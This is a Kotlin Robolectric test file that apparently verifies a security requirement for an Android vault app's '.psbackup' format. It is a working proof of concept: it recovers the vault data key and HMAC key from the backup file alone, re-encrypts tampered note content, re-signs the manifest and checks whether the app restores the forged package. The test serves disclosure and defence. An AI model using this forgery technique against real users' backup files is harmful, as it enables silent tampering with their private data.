package app.personalspace.vault.data

import androidx.test.core.app.ApplicationProvider
import app.personalspace.vault.IsolatedVaultTestRig
import app.personalspace.vault.core.crypto.Argon2KdfConfig
import app.personalspace.vault.core.crypto.VaultCryptoEngine
import app.personalspace.vault.data.backup.BackupPackageManifest
import app.personalspace.vault.domain.model.BackupKind
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.io.File
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import java.util.zip.ZipOutputStream
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/**
 * PROOF for requirement #8 (second half): after recovering the vault data key from the file alone,
 * an attacker can also FORGE a package that the app accepts as authentic.
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [34])
class PortableForgeProbeTest {
    private val ev = StringBuilder()
    private fun note(s: String) { ev.append(s).append('\n'); println("FORGE| $s") }
    private fun dump(t: String) { File("/home/user/verification/evidence/" + t + ".txt").apply { parentFile?.mkdirs() }.writeText(ev.toString()) }
    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = true }

    @Test
    fun `G2 recovered keys are enough to forge a package the app accepts as authentic`() = runBlocking {
        val rig = IsolatedVaultTestRig(ApplicationProvider.getApplicationContext(), "forge_g2")
        try {
            rig.initializeAndUnlockVault("Forge#2026")
            rig.repository.saveRecord(null, "Original", "genuine text", null, null, emptyList())
            val pkg = rig.backupManager.createFullBackupFile(BackupKind.FULL_MANUAL, recordHistoryInDb = false).file

            // ---------- attacker: file only ----------
            val manifestText = ZipFile(pkg).use { z -> z.getInputStream(z.getEntry("manifest.json")).readBytes().decodeToString() }
            val raw = json.parseToJsonElement(manifestText).jsonObject
            val vaultId = raw["vaultId"]!!.jsonPrimitive.content
            val backupId = raw["backupId"]!!.jsonPrimitive.content
            val w = raw["portableKeyWrap"]!!.jsonObject
            val a = w["argon2Config"]!!.jsonObject
            val wrapKey = VaultCryptoEngine.derivePasswordWrappingKey(
                ("psbackup-portable:" + vaultId).toCharArray(),
                VaultCryptoEngine.fromBase64(w["saltBase64"]!!.jsonPrimitive.content),
                Argon2KdfConfig(
                    a["memoryKiB"]!!.jsonPrimitive.content.toInt(),
                    a["iterations"]!!.jsonPrimitive.content.toInt(),
                    a["parallelism"]!!.jsonPrimitive.content.toInt()
                )
            )
            val vdk = VaultCryptoEngine.decryptAesGcm(
                wrapKey,
                VaultCryptoEngine.fromBase64(w["ivBase64"]!!.jsonPrimitive.content),
                VaultCryptoEngine.fromBase64(w["ciphertextBase64"]!!.jsonPrimitive.content),
                ("psbackup-portable-aad:" + vaultId).toByteArray()
            )
            wrapKey.fill(0)
            val keys = VaultCryptoEngine.deriveSubKeys(vdk, vaultId)
            note("step 1: derived backupPayloadKey + backupManifestKey from the FILE ALONE = true")

            // ---------- tamper the snapshot and re-sign the manifest ----------
            val snapshotAad = ("PersonalSpace/v1/backup/" + backupId + "/" + vaultId).toByteArray()
            val encSnapshot = ZipFile(pkg).use { z -> z.getInputStream(z.getEntry("vault_snapshot.enc")).readBytes() }
            val plain = VaultCryptoEngine.decryptAesGcm(
                keys.backupPayloadKey, VaultCryptoEngine.fromBase64(raw["snapshotIvBase64"]!!.jsonPrimitive.content),
                encSnapshot, snapshotAad
            )
            val tampered = plain.decodeToString().replace("genuine text", "TAMPERED BY ATTACKER")
            val (newIv, newEnc) = VaultCryptoEngine.encryptAesGcm(keys.backupPayloadKey, tampered.toByteArray(), snapshotAad)
            note("step 2: snapshot re-encrypted with attacker content = ${tampered.contains("TAMPERED")}")

            val parsed = json.decodeFromString(BackupPackageManifest.serializer(), manifestText)
            val resigned = parsed.copy(
                snapshotIvBase64 = VaultCryptoEngine.toBase64(newIv),
                encryptedSnapshotSha256Hex = VaultCryptoEngine.sha256Hex(newEnc),
                manifestHmacBase64 = ""
            )
            val canonical = json.encodeToString(BackupPackageManifest.serializer(), resigned)
            val mac = Mac.getInstance("HmacSHA256")
            mac.init(SecretKeySpec(keys.backupManifestKey, "HmacSHA256"))
            val forgedHmac = VaultCryptoEngine.toBase64(mac.doFinal(canonical.toByteArray()))
            val forgedManifest = resigned.copy(manifestHmacBase64 = forgedHmac)
            note("step 3: manifest re-signed with recovered HMAC key = true")

            val forged = File(rig.context.cacheDir, "forged.psbackup")
            ZipFile(pkg).use { zin ->
                ZipOutputStream(forged.outputStream().buffered()).use { zos ->
                    zin.entries().asSequence().forEach { e ->
                        zos.putNextEntry(ZipEntry(e.name))
                        val bytes = when (e.name) {
                            "vault_snapshot.enc" -> newEnc
                            "manifest.json" -> json.encodeToString(BackupPackageManifest.serializer(), forgedManifest).toByteArray()
                            else -> zin.getInputStream(e).readBytes()
                        }
                        zos.write(bytes); zos.closeEntry()
                    }
                }
            }
            note("step 4: forged package written (${forged.length()} bytes)")

            // ---------- does the APP accept it? ----------
            val outcome = runCatching { rig.backupManager.restoreFromBackupFile(forged, "Forge#2026".toCharArray()) }
            note("step 5: app restore of FORGED package = ${outcome.fold({ it.toString() }, { it.javaClass.simpleName + ": " + it.message?.take(80) })}")
            val notes = rig.dbHolder.getDatabase().recordDao().getAllRecordsIncludingDeleted()
            note("        notes now in vault = ${notes.map { it.title }}")
            note("        note body now       = ${notes.map { it.description }}")
            note("")
            note("RESULT: authenticity of a .psbackup is NOT a trust boundary for whoever holds the file.")
            note("        HMAC tamper-detection defends against corrupt/edited-by-third-party files,")
            note("        but NOT against an attacker who has the file, because the MAC key itself")
            note("        is wrapped inside the same file (portableKeyWrap).")
            dump("portG2_forge_capability")
        } finally { rig.close() }
    }
}
